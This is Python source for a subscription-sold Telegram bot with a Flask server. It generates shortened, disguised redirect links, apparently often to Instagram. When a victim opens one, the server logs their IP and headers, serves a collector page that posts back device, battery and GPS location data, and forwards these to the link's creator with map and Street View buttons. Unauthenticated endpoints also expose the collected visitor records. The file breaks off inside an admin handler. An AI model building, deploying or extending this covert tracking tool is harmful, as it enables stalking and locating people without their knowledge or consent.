import os
import json
import time
import threading
import subprocess
import requests
import random
import string
import html
from io import BytesIO
from datetime import datetime
from flask import Flask, request, send_file, redirect, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton


def load_dotenv(path):
    if not os.path.exists(path):
        return False
    with open(path, 'r', encoding='utf-8') as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            key, value = line.split('=', 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            if key and key not in os.environ:
                os.environ[key] = value
    return True

load_dotenv(os.path.join(os.path.dirname(__file__), '.env'))

# ============================================
# 🔧 الإعدادات - غيرها هنا بس!
# ============================================
def _get_env(name, default=""):
    value = os.getenv(name, default)
    if value is None:
        return default
    return value.strip()


def _get_admin_ids():
    raw_value = _get_env('ADMIN_IDS', '')
    if not raw_value:
        return []

    try:
        parsed = json.loads(raw_value)
        if isinstance(parsed, list):
            return [int(item) for item in parsed if str(item).strip()]
    except Exception:
        pass

    ids = []
    for item in raw_value.replace(' ', '').split(','):
        if not item:
            continue
        try:
            ids.append(int(item))
        except ValueError:
            continue
    return ids


BOT_TOKEN = _get_env('BOT_TOKEN', '')
ADMIN_IDS = _get_admin_ids()
CUTTLY_API_KEY = _get_env('CUTTLY_API_KEY', '')

# الرابط الافتراضي للتحويل (لو محددتش)
DEFAULT_REDIRECT = "https://www.instagram.com/"


def apply_runtime_config():
    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
    if env_url and config.get('server_url_source') != 'manual':
        config['server_url'] = env_url
        config['server_url_source'] = 'env'

    port_value = _get_env('PORT', '')
    if port_value:
        try:
            config['port'] = int(port_value)
        except ValueError:
            pass

    save_json(CONFIG_FILE, config)

# ============================================
# 📁 ملفات التخزين
# ============================================
LINKS_FILE = "generated_links.json"
VISITS_FILE = "visits.json"
CONFIG_FILE = "config.json"
SUBSCRIBERS_FILE = "subscribers.json"
SUBSCRIBER_DETAILS_FILE = "subscriber_details.json"

# ============================================
# 🔑 إعدادات APIs للاختصار
# ============================================
SHORTENER_APIS = {
    'tinyurl': True,
    'isgd': True,
    'shrtco': True,
    'cuttly': False,
}

# ============================================
# 🚀 تهيئة Flask
# ============================================
app = Flask(__name__)

# ============================================
# 📦 تحميل البيانات المخزنة
# ============================================
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

generated_links = load_json(LINKS_FILE, {})
visits_data = load_json(VISITS_FILE, {})
config = load_json(CONFIG_FILE, {
    'server_url': '',
    'server_url_source': '',
    'cloudflared_running': False,
    'cloudflared_tunnel': '',
    'port': 5000
})
config.setdefault('server_url', '')
config.setdefault('server_url_source', '')
config.setdefault('cloudflared_running', False)
config.setdefault('cloudflared_tunnel', '')
config.setdefault('port', 5000)

apply_runtime_config()

subscribers_data = load_json(SUBSCRIBERS_FILE, ADMIN_IDS)
if not isinstance(subscribers_data, list):
    subscribers_data = ADMIN_IDS
subscribers = set(subscribers_data) | set(ADMIN_IDS)

pending_location_link_requests = {}
pending_admin_actions = {}
subscriber_names = {}
subscriber_details = {}
active_server_url = ''

BROADCAST_PHOTO_MODE = 'photo'

# ============================================
# 🤖 تهيئة البوت
# ============================================
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN غير موجود. أضفه في ملف .env أو في متغيرات البيئة.")

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# 📊 دوال مساعدة
# ============================================
def generate_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def normalize_server_url(url):
    if not isinstance(url, str):
        return ''
    url = url.strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def get_client_ip():
    """احصل على IP الزائر من الهيدر أو من request.remote_addr"""
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    real_ip = request.headers.get('X-Real-IP', '')
    if real_ip:
        return real_ip.strip()
    cf_ip = request.headers.get('CF-Connecting-IP', '')
    if cf_ip:
        return cf_ip.strip()
    return request.remote_addr or 'غير معروف'


def get_server_url():
    """الحصول على الرابط العام للسيرفر"""
    live_url = normalize_server_url(active_server_url)
    if live_url:
        return live_url

    if config.get('server_url_source') == 'env':
        env_url = normalize_server_url(config.get('server_url', ''))
        if env_url:
            return env_url

    if config.get('server_url_source') == 'manual':
        manual_url = normalize_server_url(config.get('server_url', ''))
        if manual_url:
            return manual_url

    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
    if env_url:
        return env_url
    return ''


def save_subscribers():
    save_json(SUBSCRIBERS_FILE, sorted(subscribers))


def safe_text(value, fallback='غير متاح'):
    if value is None:
        return fallback
    if isinstance(value, str):
        return value
    try:
        return str(value)
    except Exception:
        return fallback


def escape_text(value, fallback='غير متاح', quote=False):
    return html.escape(safe_text(value, fallback), quote=quote)


def save_subscriber_details():
    save_json(SUBSCRIBER_DETAILS_FILE, subscriber_details)


def load_subscriber_details():
    loaded = load_json(SUBSCRIBER_DETAILS_FILE, {})
    if not isinstance(loaded, dict):
        return {}

    normalized = {}
    for raw_key, value in loaded.items():
        try:
            user_id = int(raw_key)
        except (TypeError, ValueError):
            continue

        if isinstance(value, dict):
            normalized[user_id] = {
                'id': user_id,
                'name': safe_text(value.get('name'), 'غير معروف'),
                'username': safe_text(value.get('username'), 'لا يوجد')
            }

    return normalized


def initialize_subscriber_cache():
    global subscriber_details, subscriber_names
    subscriber_details = load_subscriber_details()
    subscriber_names = {}
    for user_id, details in subscriber_details.items():
        name = details.get('name') or 'غير معروف'
        username = details.get('username') or 'لا يوجد'
        if name != 'غير معروف':
            subscriber_names[user_id] = name
        elif username != 'لا يوجد':
            subscriber_names[user_id] = username
        else:
            subscriber_names[user_id] = str(user_id)


initialize_subscriber_cache()


def is_subscribed(user_id):
    return user_id in subscribers


def notify_admin_new_user(user):
    if not ADMIN_IDS:
        return
    try:
        full_name = " ".join(filter(None, [getattr(user, 'first_name', ''), getattr(user, 'last_name', '')])) or 'غير معروف'
        username = getattr(user, 'username', None) or 'لا يوجد'
        user_id = getattr(user, 'id', 'غير معروف')
        message = (
            "🆕 <b>مستخدم جديد بدأ البوت</b>\n\n"
            f"👤 <b>الاسم:</b> {html.escape(full_name)}\n"
            f"@ <b>اليوزر:</b> {html.escape(str(username))}\n"
            f"🆔 <b>الايدي:</b> {html.escape(str(user_id))}"
        )
        for admin_id in ADMIN_IDS:
            bot.send_message(admin_id, message, parse_mode='HTML')
    except Exception as e:
        print(f"❌ خطأ في إشعار الأدمن: {e}")


def remember_subscriber_info(user):
    try:
        user_id = getattr(user, 'id', None)
        if not user_id:
            return
        full_name = " ".join(filter(None, [getattr(user, 'first_name', ''), getattr(user, 'last_name', '')])) or 'غير معروف'
        username = getattr(user, 'username', None) or 'لا يوجد'
        label = full_name if full_name != 'غير معروف' else (username if username != 'لا يوجد' else str(user_id))
        subscriber_names[user_id] = label
        subscriber_details[user_id] = {
            'id': user_id,
            'name': full_name,
            'username': username,
        }
        save_subscriber_details()
    except Exception:
        pass


def get_subscriber_display_name(user_id):
    details = subscriber_details.get(user_id, {})
    name = details.get('name') or 'غير معروف'
    username = details.get('username') or 'لا يوجد'

    if name != 'غير معروف' and username != 'لا يوجد':
        return f"{name} (@{username})"
    if name != 'غير معروف':
        return name
    if username != 'لا يوجد':
        return f"@{username}"
    return subscriber_names.get(user_id, str(user_id))


def build_contact_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📩 تواصل مع صاحب البوت", url="https://t.me/MM_EZ"))
    return keyboard


def build_main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📍 رابط وسيط جديد", callback_data="get_location_link"))
    keyboard.add(InlineKeyboardButton("📩 تواصل مع صاحب البوت", url="https://t.me/MM_EZ"))
    return keyboard


def subscription_block_message():
    return (
        "❌ أنت غير مشترك لا يمكنك استخدام البوت.\n"
        "للاشتراك تواصل مع صاحب البوت عبر الزر أدناه."
    )


def is_valid_url(url):
    return isinstance(url, str) and url.startswith(('http://', 'https://'))


def get_runtime_port(default=5000):
    """الحصول على منفذ التشغيل من البيئة أو من الإعدادات مع fallback آمن."""
    port_value = _get_env('PORT', '')
    if port_value:
        try:
            return int(port_value)
        except ValueError:
            pass

    try:
        return int(config.get('port', default))
    except (TypeError, ValueError):
        return default


def run_cloudflared():
    """تشغيل Cloudflared والحصول على الرابط"""
    port = get_runtime_port()
    tunnel_name = config.get('cloudflared_tunnel', '').strip()

    if tunnel_name:
        command = ['cloudflared', 'tunnel', 'run', tunnel_name, '--url', f'http://localhost:{port}']
        print(f"🌩️ جاري تشغيل Cloudflared tunnel '{tunnel_name}'...")
    else:
        command = ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}']
        print("🌩️ جاري تشغيل Cloudflared بنفق مؤقت...")

    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        while True:
            line = process.stdout.readline()
            if not line:
                break
            if 'https://' in line and '.trycloudflare.com' in line:
                url = line.split('https://')[1].strip().split()[0]
                public_url = f"https://{url}"
                normalized_url = normalize_server_url(public_url)
                global active_server_url
                active_server_url = normalized_url
                config['cloudflared_running'] = True
                config['server_url_source'] = 'cloudflared'
                print(f"✅ الرابط العام: {normalized_url}")
                return True
    except Exception as e:
        print(f"❌ خطأ في Cloudflared: {e}")
    return False


def run_tunnel():
    """يحاول استخدام رابط سيرفر موجود أو تشغيل Cloudflared"""
    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
    if env_url:
        global active_server_url
        active_server_url = env_url
        config['server_url'] = env_url
        config['server_url_source'] = 'env'
        print(f"✅ تم استخدام رابط البيئة: {env_url}")
        return True

    if run_cloudflared():
        return True

    manual_url = normalize_server_url(config.get('server_url', ''))
    if config.get('server_url_source') == 'manual' and manual_url:
        print(f"✅ تم استخدام رابط السيرفر اليدوي كحل احتياطي: {manual_url}")
        global active_server_url
        active_server_url = manual_url
        return True

    print("⚠️ لم يتم إنشاء نفق تلقائيًا. ثبت Cloudflared واستخدم /settunnel <name> لتشغيله أو استخدم /setserver <url>.")
    return False


def ensure_server_url():
    """تضمن وجود رابط خارجي قبل إنشاء الروابط"""
    if get_server_url():
        return True
    return run_tunnel()


def shorten_urls(url):
    """تقصير الرابط إلى عدة خيارات"""
    results = {}
    seen = set()

    def add_result(service, value):
        if isinstance(value, str) and value.strip() and value not in seen:
            seen.add(value)
            results[service] = value.strip()

    if SHORTENER_APIS.get('isgd', True):
        try:
            resp = requests.get(f"https://is.gd/create.php?format=json&url={url}", timeout=10)
            if resp.status_code == 200:
                shorturl = resp.json().get('shorturl')
                add_result('is.gd', shorturl)
        except Exception:
            pass

    if SHORTENER_APIS.get('tinyurl', True):
        try:
            resp = requests.get(f"https://tinyurl.com/api-create.php?url={url}", timeout=10)
            if resp.text and 'Error' not in resp.text:
                add_result('tinyurl.com', resp.text.strip())
        except Exception:
            pass

    if SHORTENER_APIS.get('shrtco', True):
        try:
            resp = requests.get(f"https://api.shrtco.de/v2/shorten?url={url}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and data.get('ok'):
                    result = data.get('result', {})
                    add_result('shrtco.de', result.get('short_link'))
        except Exception:
            pass

    if SHORTENER_APIS.get('cuttly', False) and CUTTLY_API_KEY:
        try:
            resp = requests.get(f"https://cutt.ly/api/api.php?key={CUTTLY_API_KEY}&short={url}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict):
                    url_data = data.get('url')
                    if isinstance(url_data, dict):
                        add_result('cutt.ly', url_data.get('shortLink'))
        except Exception:
            pass

    results['direct'] = url
    return results

# ============================================
# 🌐 مسارات Flask (السيرفر)
# ============================================

@app.route('/')
def home():
    """الصفحة الرئيسية"""
    return """
    <!DOCTYPE html>
    <html>
    <head><title>رابط وسيط</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px;">
        <h1>🚀 السيرفر شغال!</h1>
        <p>استخدم بوت التليجرام لإنشاء روابط وسيطة</p>
        <p style="color: #666; font-size: 14px;">@SmartRedirectBot</p>
    </body>
    </html>
    """

@app.route('/<code>')
def handle_redirect(code):
    """معالجة الرابط الوسيط"""
    if code not in generated_links:
        return "⚠️ الرابط غير صحيح أو منتهي الصلاحية", 404
    
    link_data = generated_links[code]
    original_url = link_data.get('original_url', DEFAULT_REDIRECT)
    
    # تسجيل الزيارة
    visitor_data = {
        'ip': get_client_ip(),
        'user_agent': request.headers.get('User-Agent'),
        'headers': dict(request.headers),
        'timestamp': datetime.now().isoformat(),
        'code': code
    }
    
    if code not in visits_data:
        visits_data[code] = []
    visits_data[code].append(visitor_data)
    save_json(VISITS_FILE, visits_data)
    
    # تحديث عدد الزيارات
    link_data['visits'] = len(visits_data[code])
    generated_links[code] = link_data
    save_json(LINKS_FILE, generated_links)
    
    # إرجاع صفحة التجميع
    return send_file('collector.html')


@app.route('/collect/<code>', methods=['POST'])
def collect_data(code):
    """استقبال البيانات من الصفحة"""
    data = request.get_json(silent=True) or {}

    if code in visits_data and visits_data[code]:
        visits_data[code][-1].update(data)
        save_json(VISITS_FILE, visits_data)

        if code in generated_links:
            user_id = generated_links[code].get('user_id')
            if user_id:
                send_notification(user_id, code, visits_data[code][-1])

    return jsonify({"status": "success"})


@app.route('/link/<code>')
def get_original_link(code):
    """إرجاع الرابط الأصلي"""
    if code in generated_links:
        return jsonify({
            'original_url': generated_links[code].get('original_url', DEFAULT_REDIRECT)
        })
    return jsonify({'error': 'رابط غير موجود'}), 404

@app.route('/api/stats/<code>')
def get_stats(code):
    """جلب إحصائيات رابط"""
    if code not in visits_data:
        return jsonify({"visits": 0, "data": []})
    return jsonify({
        "visits": len(visits_data[code]),
        "data": visits_data[code]
    })

@app.route('/api/all')
def get_all_stats():
    """جلب كل الإحصائيات"""
    stats = {}
    for code, data in generated_links.items():
        stats[code] = {
            'original_url': data.get('original_url'),
            'visits': len(visits_data.get(code, [])),
            'created_at': data.get('created_at'),
            'user_id': data.get('user_id')
        }
    return jsonify(stats)

# ============================================
# 📨 دوال إشعارات التليجرام
# ============================================

def send_notification(user_id, code, data):
    """إرسال إشعار للمستخدم"""
    try:
        message = "🔔 <b>زيارة جديدة للرابط</b>\n\n"
        message += f"📌 <b>الكود:</b> <code>{escape_text(code)}</code>\n"
        message += f"🌐 <b>IP:</b> <code>{escape_text(data.get('ip', 'غير معروف'))}</code>\n"
        message += f"🧾 <b>User-Agent:</b> <code>{escape_text(data.get('user_agent', 'غير معروف'))}</code>\n"
        message += f"📱 <b>الجهاز:</b> {escape_text(data.get('device', 'غير معروف'))}\n"
        message += f"🌍 <b>المتصفح:</b> {escape_text(data.get('browser', 'غير معروف'))}\n"
        message += f"🖥️ <b>الشاشة:</b> {escape_text(data.get('screen', 'غير معروف'))}\n"
        message += f"⏰ <b>المنطقة الزمنية:</b> {escape_text(data.get('timezone', 'غير معروف'))}\n"
        
        # البطارية
        battery = data.get('battery', {}) or {}
        if isinstance(battery, dict) and battery.get('level') != 'غير متاح':
            battery_text = battery.get('levelPercent', f"{battery.get('level', 0)}%")
            message += f"🔋 <b>البطارية:</b> {escape_text(battery_text)}"
            if battery.get('charging'):
                message += " ⚡ (شحن)"
            message += "\n"
        else:
            message += "🔋 <b>البطارية:</b> غير متاحة\n"
        
        # الموقع
        location = data.get('location', {}) or {}
        if isinstance(location, dict) and (location.get('available') or (location.get('lat') is not None and location.get('lng') is not None)):
            lat = location.get('lat')
            lng = location.get('lng')
            map_url = escape_text(f"https://www.google.com/maps?q={lat},{lng}", quote=True)
            message += f"\n📍 <b>الموقع:</b> <a href=\"{map_url}\">{escape_text(lat)}, {escape_text(lng)}</a>\n"
            message += f"🎯 <b>الدقة:</b> {escape_text(location.get('accuracy', 0))} متر\n"
            
            # روابط الخرائط كأزرار
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("🗺️ خرائط جوجل", url=f"https://www.google.com/maps?q={lat},{lng}"),
                InlineKeyboardButton("🌍 جوجل إيرث", url=f"https://earth.google.com/web/@{lat},{lng},0a,1000d")
            )
            keyboard.add(
                InlineKeyboardButton("🚶 عرض الشارع", url=f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lng}")
            )
            
            bot.send_message(
                user_id,
                message,
                parse_mode='HTML',
                reply_markup=keyboard,
                disable_web_page_preview=False
            )
            return
        else:
            message += f"\n📍 <b>الموقع:</b> ❌ {escape_text(location.get('error', 'غير معروف'))}\n"
        
        message += f"\n⏱️ <b>الوقت:</b> {escape_text(data.get('timestamp', 'غير معروف'))}"
        
        bot.send_message(
            user_id,
            message,
            parse_mode='HTML'
        )
        
    except Exception as e:
        print(f"❌ خطأ في الإشعار: {e}")

# ============================================
# 🤖 أوامر البوت
# ============================================

@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    user_id = user.id
    keyboard = build_main_keyboard()

    remember_subscriber_info(user)
    notify_admin_new_user(user)

    if not is_subscribed(user_id):
        bot.send_message(
            user_id,
            subscription_block_message(),
            parse_mode='HTML',
            reply_markup=keyboard
        )
        return

    bot.send_message(
        message.chat.id,
        "🎯 <b>مرحباً بك في بوت الروابط الوسيطة!</b>\n\n"
        "📤 أرسل لي أي رابط وسأقوم بتحويله إلى رابط وسيط.\n"
        "أو اضغط الزر لإنشاء الرابط بعد ذلك.\n"
        "عندما يفتحه أحدهم، ستتلقى إشعاراً بكل التفاصيل.\n\n"
        "📩 إذا كنت تريد التواصل مع صاحب البوت، استخدم الزر أدناه.",
        parse_mode='HTML',
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == 'get_location_link')
def get_location_link_callback(call):
    user_id = call.from_user.id
    if not is_subscribed(user_id):
        bot.answer_callback_query(call.id, subscription_block_message(), show_alert=True)
        return

    pending_location_link_requests[user_id] = True
    bot.answer_callback_query(call.id, "✅ أرسل الرابط الآن", show_alert=True)
    bot.send_message(
        user_id,
        "📍 أرسل الرابط الذي تريد تحويله إلى رابط وسيط.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: m.text and m.from_user.id in pending_location_link_requests and not m.text.startswith('/') and not m.text.startswith(('http://', 'https://')))
def get_location_link_invalid(message):
    bot.reply_to(message, "❌ الرجاء إرسال رابط صالح يبدأ بـ http:// أو https://")


@bot.message_handler(func=lambda m: m.text and m.text.startswith('/') and m.from_user.id in pending_location_link_requests)
def clear_pending_location_request(message):
    pending_location_link_requests.pop(message.from_user.id, None)

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(
        message,
        "📚 <b>المساعدة:</b>\n\n"
        "1️⃣ أرسل رابط (يبدأ بـ http أو https)\n"
        "2️⃣ سيتم إنشاء رابط وسيط لك\n"
        "3️⃣ عندما يفتحه أحدهم، ستتلقى إشعاراً\n"
        "4️⃣ يمكنك رؤية الإحصائيات عبر /stats\n\n"
        "🔗 <b>مثال:</b>\n"
        "أرسل: <code>https://www.instagram.com/p/abc123/</code>\n"
        "ستحصل على رابط وسيط مثل:\n"
        "<code>https://your-server.xyz/xyz789</code>",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: m.text and m.from_user.id in pending_admin_actions and pending_admin_actions[m.from_user.id] == 'add_subscriber')
def admin_add_subscriber_input(message):
    if message.from_user.id not in ADMIN_IDS:
        return

    try:
        new_id = int(message.text.strip())
    except ValueError:
        bot.reply_to(message, "⚠️ الرجاء إرسال ID رقمي صالح")
        return

    if new_id in subscribers:
        bot.reply_to(message, "⚠️ هذا المشترك موجود بالفعل")
        return

    subscribers.add(new_id)
    save_subscribers()
    pending_admin_actions.pop(message.from_user.id, None)
    bot.reply_to(message, f"✅ تم إضافة المشترك الجديد: {new_id}")


@bot.message_handler(func=lambda m: m.text and m.from_user.id in pending_admin_actions and pending_admin_actions[m.from_user.id] == 'broadcast')
def admin_broadcast_input(message):
    if message.from_user.id not in ADMIN_IDS:
        return

    text = message.text.strip()
    if not text:
        bot.reply_to(message, "⚠️ لا يمكن إرسال رسالة فارغة")
        return

    pending_admin_actions.pop(message.from_user.id, None)
    recipients = [sid for sid in sorted(subscribers) if sid not in ADMIN_IDS]
    sent_count = 0

    for sid in recipients:
        try:
            bot.send_message(sid, f"📢 <b>رسالة جماعية من الإدارة</b>\n\n{text}", parse_mode='HTML')
            sent_count += 1
        except Exception:
            continue

    bot.reply_to(message, f"✅ تم إرسال الرسالة إلى {sent_count} مشترك")


@bot.message_handler(content_types=['photo'], func=lambda m: m.from_user.id in pending_admin_actions and pending_admin_actions[m.from_user.id] == 'broadcast_photo')
def admin_broadcast_photo(message):
    if message.from_user.id not in ADMIN_IDS:
        return

    file_id = message.photo[-1].file_id
    caption = (message.caption or '').strip()
    pending_admin_actions.pop(message.from_user.id, None)

    recipients = [sid for sid in sorted(subscribers) if sid not in ADMIN_IDS]
    sent_count = 0

    for sid in recipients:
        try:
            bot.send_photo(sid, file_id, caption=caption or "📢 رسالة جماعية من الإدارة")
            sent_count += 1
        except Exception:
            continue

    bot.reply_to(message, f"✅ تم إرسال الصورة إلى {sent_count} مشترك")


@bot.message_handler(func=lambda m: m.text and not m.text.startswith('/') and not m.text.startswith(('http://', 'https://')))
def handle_non_link_message(message):
    user_id = message.from_user.id
    if not is_subscribed(user_id):
        bot.reply_to(
            message,
            subscription_block_message(),
            parse_mode='HTML',
            reply_markup=build_main_keyboard()
        )


@bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
def handle_link(message):
    original_url = message.text.strip()
    user_id = message.from_user.id
    
    # التحقق من صحة الرابط
    if not is_valid_url(original_url):
        bot.reply_to(message, "❌ الرابط غير صالح! الرجاء إرسال رابط يبدأ بـ http:// أو https://")
        return

    server_url = get_server_url()
    if not server_url:
        bot.send_chat_action(message.chat.id, 'typing')
        if not ensure_server_url():
            bot.reply_to(
                message,
                "❌ لا يوجد رابط خارجي متاح حالياً.\n"
                "تأكد من تثبيت Cloudflared وتشغيله أو استخدم /settunnel <name> مع tunnel صالح.\n"
                "لن يُنشأ رابط داخلي محلي.",
                parse_mode='Markdown'
            )
            return
        server_url = get_server_url()
        if not server_url:
            bot.reply_to(
                message,
                "❌ فشل الحصول على رابط خارجي بعد تشغيل Cloudflared.\n"
                "تحقق من اسم tunnel أو الحالة في Cloudflare.",
                parse_mode='Markdown'
            )
            return

    if not is_subscribed(user_id):
        bot.send_message(
            user_id,
            subscription_block_message(),
            parse_mode='HTML',
            reply_markup=build_contact_keyboard()
        )
        return

    # إنشاء الرابط الوسيط
    code = generate_code()
    middle_url = f"{server_url}/{code}"
    
    # حفظ البيانات
    generated_links[code] = {
        'original_url': original_url,
        'user_id': user_id,
        'created_at': time.time(),
        'visits': 0
    }
    save_json(LINKS_FILE, generated_links)
    
    # اختصار الرابط
    short_links = shorten_urls(middle_url)
    
    # إرسال الرد
    keyboard = InlineKeyboardMarkup()
    if middle_url.startswith('https://'):
        keyboard.add(
            InlineKeyboardButton("🔗 فتح الرابط", url=middle_url),
            InlineKeyboardButton("📋 نسخ", callback_data=f"copy_{code}")
        )
    else:
        keyboard.add(
            InlineKeyboardButton("📋 نسخ", callback_data=f"copy_{code}")
        )
    keyboard.add(
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"stats_{code}")
    )
    keyboard.add(
        InlineKeyboardButton("� تواصل مع صاحب البوت", url="https://t.me/MM_EZ")
    )
    
    contact_text = "📩 للتواصل مع صانع البوت: @MM_EZ"

    response_title = "✅ <b>تم إنشاء الرابط الوسيط بنجاح!</b>"
    short_links_lines = []
    for index, (service, link) in enumerate(short_links.items(), start=1):
        label = service if service != 'direct' else 'الرابط الأصلي'
        short_links_lines.append(f"<b>{index}. {escape_text(label)}:</b> <code>{escape_text(link)}</code>")

    if not short_links_lines:
        short_links_lines.append(f"<b>1. الرابط الأصلي:</b> <code>{escape_text(middle_url)}</code>")

    bot.send_message(
        user_id,
        f"{response_title}\n\n"
        f"📎 <b>الرابط الأصلي:</b>\n<code>{escape_text(original_url)}</code>\n\n"
        f"🌐 <b>رابط العرض:</b>\n<code>{escape_text(middle_url)}</code>\n\n"
        f"🔗 <b>روابط مختصرة:</b>\n{escape_text('')}\n"
        + "\n".join(short_links_lines) + "\n\n"
        f"🆔 <b>الكود:</b> <code>{escape_text(code)}</code>\n"
        f"👥 <b>الزيارات:</b> 0\n\n"
        f"{escape_text(contact_text)}\n\n"
        f"<i>عندما يفتح أحدهم الرابط، ستصلك تفاصيل الزائر مباشرة.</i>",
        reply_markup=keyboard,
        parse_mode='HTML'
    )

    if not middle_url.startswith('https://'):
        bot.send_message(
            user_id,
            "⚠️ لا يمكن إنشاء زر فتح للرابط لأن الرابط الحالي ليس HTTPS.\n"
            "تأكد من أن رابط السيرفر الخارجي يبدأ بـ https://",
            parse_mode='Markdown'
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
def copy_link(call):
    code = call.data.split('_')[1]
    if code in generated_links:
        server_url = get_server_url()
        middle_url = f"{server_url}/{code}"
        bot.answer_callback_query(call.id, f"✅ تم النسخ: {middle_url}", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⚠️ الرابط غير موجود", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stats_'))
def show_stats_callback(call):
    code = call.data.split('_')[1]
    if code in generated_links:
        visits = len(visits_data.get(code, []))
        bot.answer_callback_query(
            call.id,
            f"📊 الزيارات: {visits}",
            show_alert=True
        )
    else:
        bot.answer_callback_query(call.id, "⚠️ الرابط غير موجود", show_alert=True)

@bot.message_handler(commands=['server'])
def show_server(message):
    user_id = message.from_user.id
    server_url = get_server_url()
    bot.reply_to(
        message,
        f"🌐 رابط السيرفر الحالي: {server_url}\n\n"
        "إذا كنت تستخدم سيرفر خارجيًا، استخدم /setserver <url> لتعيينه.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['setserver'])
def set_server(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا الأمر.")
        return
    try:
        url = message.text.split(maxsplit=1)[1].strip()
        normalized_url = normalize_server_url(url)
        if not normalized_url:
            bot.reply_to(message, "❌ الرجاء إرسال رابط صالح يبدأ بـ http:// أو https:// أو example.com")
            return
        config['server_url'] = normalized_url
        config['server_url_source'] = 'manual'
        save_json(CONFIG_FILE, config)
        bot.reply_to(message, f"✅ تم تعيين رابط السيرفر الخارجي إلى:\n{normalized_url}")
    except IndexError:
        bot.reply_to(message, "⚠️ استخدم: /setserver https://example.com")

@bot.message_handler(commands=['settunnel'])
def set_tunnel(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ غير مصرح لك باستخدام هذا الأمر.")
        return
    try:
        tunnel_name = message.text.split(maxsplit=1)[1].strip()
        if not tunnel_name:
            raise IndexError
        config['cloudflared_tunnel'] = tunnel_name
        save_json(CONFIG_FILE, config)
        bot.reply_to(message, f"✅ تم تعيين اسم Cloudflared tunnel إلى:\n{tunnel_name}")
    except IndexError:
        bot.reply_to(message, "⚠️ استخدم: /settunnel my-tunnel-name")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.from_user.id
    user_links = {k: v for k, v in generated_links.items() if v.get('user_id') == user_id}
    
    if not user_links:
        bot.reply_to(message, "📭 ليس لديك أي روابط وسيطة.")
        return
    
    text = "📊 **إحصائيات روابطك:**\n\n"
    for code, data in list(user_links.items())[:15]:
        visits = len(visits_data.get(code, []))
        text += f"🔗 `{code}` - {visits} زيارة\n"
    
    text += f"\n_المجموع: {len(user_links)} رابط_"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['delete'])
def delete_link(message):
    try:
        code = message.text.split()[1]
        if code in generated_links:
            if generated_links[code].get('user_id') == message.from_user.id or message.from_user.id in ADMIN_IDS:
                del generated_links[code]
                save_json(LINKS_FILE, generated_links)
                bot.reply_to(message, f"✅ تم حذف الرابط `{code}`", parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ هذا الرابط ليس لك!")
        else:
            bot.reply_to(message, "❌ الرابط غير موجود")
    except:
        bot.reply_to(message, "⚠️ استخدم: /delete <كود_الرابط>")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ غير مصرح لك!")
        return

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("➕ إضافة مشترك جديد", callback_data="admin_add_subscriber"),
        InlineKeyboardButton("👥 عرض المشتركين", callback_data="admin_view_subscribers")
    )
    keyboard.add(
        InlineKeyboardButton("📢 إرسال رسالة للجميع", callback_data="admin_broadcast"),
        InlineKeyboardButton("🖼️ إرسال صورة للجميع", callback_data="admin_broadcast_photo")
    )
    keyboard.add(
        InlineKeyboardButton("🗑️ إزالة مشترك", callback_data="admin_remove_subscriber_menu")
    )

    bot.send_message(
        message.chat.id,
        "🛠️ <b>لوحة الأدمن</b>\n\nاختر الإجراء المطلوب:",
        parse_mode='HTML',
        reply_markup=keyboard
    )


@bot.callback_query_handler(func=lambda call: call.data == 'admin_add_subscriber')
def admin_add_subscriber(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ غير مصرح لك", show_alert=True)
        return

    pending_admin_actions[call.from_user.id] = 'add_subscriber'
